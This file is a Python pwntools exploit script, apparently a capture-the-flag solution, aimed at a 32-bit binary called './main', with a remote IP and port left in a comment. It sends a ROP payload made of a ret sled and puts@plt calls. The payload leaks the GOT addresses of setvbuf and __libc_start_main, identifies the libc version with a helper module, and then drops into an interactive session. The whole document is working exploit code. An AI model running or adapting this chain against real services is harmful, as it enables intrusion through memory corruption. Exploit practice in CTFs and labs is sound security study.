from pwn import *
import TheNight
#target=remote('54.225.38.91',1028)
target=process('./main')
#libc=ELF('/lib32/libc.so.6')
context.terminal=["tmux","split","-h"]
#gdb.attach(target)

print(target.recvuntil("o/\n"))

nopret=0x080490af
setvbuf_GOT=0x0804c014
__libc_start_main_GOT=0x0804c010
puts_plt=0x08049030
popret=0x0804901e
payload=p32(nopret)*20+p32(puts_plt)+p32(popret)+p32(setvbuf_GOT)+p32(puts_plt)+p32(popret)+p32(__libc_start_main_GOT)+p32(nopret)
print(len(payload))

target.sendline(payload)

#print(target.recv())

leak0=target.recvline().strip("\n")
leak1=target.recvline().strip("\n")
ad1=u32(leak1[0:4])
print(hex(ad1))
leak2=target.recvline().strip("\n")
ad3=u32(leak2[0:4])
print(hex(ad3))

#print("ad1-setvbuf")
#print(hex(ad1-libc.symbols["setvbuf"]))
#print("ad3-startmain")
#print(hex(ad3-libc.symbols["__libc_start_main"]))



TheNight.findLibcVersion("setvbuf",ad1,"__libc_start_main",ad3)


target.interactive()
